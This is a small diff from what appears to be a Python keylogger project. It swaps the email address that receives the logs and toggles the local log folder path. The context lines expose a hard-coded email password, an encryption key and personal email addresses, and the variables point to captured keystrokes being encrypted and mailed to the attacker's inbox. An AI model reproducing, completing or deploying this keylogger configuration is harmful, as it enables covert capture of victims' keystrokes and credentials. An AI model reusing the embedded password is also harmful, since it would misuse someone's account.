@@ -38,12 +38,12 @@ password = "wjrx pxld iyqu lvec"
 
 username = getpass.getuser()
 
-to_addr = "boglarka_m@yahoo.com"
+to_addr = "romanrtera@gmail.com"
 
 key = "1EOZBnHLTFjU6qovA2eO_jckUR0NNGCg3Dq4Oys2WvA="
 
-# file_path = "D:\\keylog\\Keylogger\\Project"
-file_path = "C:\\Users\\BOGI\\Desktop\\Keylogger\\keylogger\\Project"
+file_path = "D:\\keylog\\Keylogger\\Project"
+# file_path = "C:\\Users\\BOGI\\Desktop\\Keylogger\\keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
